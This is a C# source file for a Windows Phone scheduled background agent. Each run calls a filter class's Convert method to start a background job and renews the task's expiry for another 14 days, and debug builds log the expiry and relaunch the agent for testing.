using Microsoft.Phone.Shell;
using System;

using System.Diagnostics;
using System.Windows;
using Microsoft.Phone.Scheduler;

using FastFilters;

//le metto tutte 
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Windows.Controls;
using System.Windows.Navigation;
using Microsoft.Phone.Controls;

using Microsoft.Win32;

using Windows.ApplicationModel;
using Windows.Phone.Management.Deployment;

namespace ScheduledTaskAgent1
{
    public class ScheduledAgent : ScheduledTaskAgent
    {
        /// <remarks>
        /// ScheduledAgent constructor, initializes the UnhandledException handler
        /// </remarks>
        static ScheduledAgent()
        {
            // Subscribe to the managed exception handler
            Deployment.Current.Dispatcher.BeginInvoke(delegate
            {
                Application.Current.UnhandledException += UnhandledException;
            });
        }

        /// Code to execute on Unhandled Exceptions
        private static void UnhandledException(object sender, ApplicationUnhandledExceptionEventArgs e)
        {
            if (Debugger.IsAttached)
            {
                // An unhandled exception has occurred; break into the debugger
                Debugger.Break();
            }
        }

        /// <summary>
        /// Agent that runs a scheduled task
        /// </summary>
        /// <param name="task">
        /// The invoked task
        /// </param>
        /// <remarks>
        /// This method is called when a periodic or resource intensive task is invoked
        /// </remarks>
        protected override void OnInvoke(ScheduledTask task)
        {
            GreyscaleFilter filter = new GreyscaleFilter();
            //fa partire la BK
            filter.Convert();
            //setta l'ExpiryTime per altri 14 giorni
            filter.BNSIUpdateExpiryTime();

#if DEBUG            
            if (task is PeriodicTask)
            {
                var nnn = task.Name.ToString();

                var str = String.Concat("PeriodicTask ", task.ExpirationTime.ToString());
                filter.BNSIsaveExpiryTime(str);
            }
            else
            {
                var str = String.Concat("IntensiveTask ", task.ExpirationTime.ToString());
                filter.BNSIsaveExpiryTime(str);
            }
#endif

            // If debugging is enabled, launch the agent again in one minute.
#if DEBUG
            ScheduledActionService.LaunchForTest(task.Name, TimeSpan.FromSeconds(60));
#endif

             // Call NotifyComplete to let the system know the agent is done working.
            NotifyComplete();
        }

    }
}